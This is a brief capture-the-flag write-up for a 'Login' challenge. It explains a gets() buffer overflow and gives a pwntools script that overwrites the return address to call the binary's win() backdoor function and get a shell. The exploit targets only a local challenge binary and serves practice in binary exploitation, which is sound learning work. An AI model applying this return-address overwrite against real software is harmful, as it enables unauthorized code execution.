# Login
## Description
Got a flag for you if you know the credentials and don't need it before the end of CTF. I left my secret backdoor shell function in there though -- I sure hope no one abuses that.
## Solution
Looking at the source, input is read in with `gets()`, so we have a buffer overflow. We're also given a `win()` function, so we just need to overwrite `rip` with the address of the `win()` function.
```python
from pwn import *

elf = ELF("./login0")
rop = ROP(elf)
context.binary = elf
context.log_level = "debug"

io = process([elf.path])
padding = 28 * b"A"
payload = padding + p32(elf.sym["win"])
io.sendline(payload);
io.sendline()
io.interactive()
```
